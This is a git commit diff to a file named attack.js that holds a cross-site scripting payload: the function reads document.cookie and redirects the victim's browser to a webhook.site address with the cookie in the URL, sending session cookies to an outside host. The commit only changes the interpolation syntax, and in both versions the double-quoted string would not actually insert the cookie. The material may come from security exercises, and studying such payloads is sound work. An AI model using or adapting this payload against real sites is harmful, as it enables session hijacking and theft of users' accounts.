e7945ea0a6ba2f67703eea0b6c1e914ddf7c87dc
el3232 <49128449+el3232@users.noreply.github.com>
2023-02-08 01:00:43 -0500

    Update attack.js

--- attack.js
+++ attack.js
@@ -1,7 +1,7 @@
 function xssPayload() {
   const alertMsg = 'xss ' + document.cookie;
   console.log(alertMsg);
-  window.location.replace("https://webhook.site/9f56f27e-407b-4645-bdd1-173484f6f8ad?theCookie=${encodeURIComponent(document.cookie)}");
+  window.location.replace("https://webhook.site/9f56f27e-407b-4645-bdd1-173484f6f8ad?theCookie=$(document.cookie)");
 }
 
 console.log('XSS payload executed');
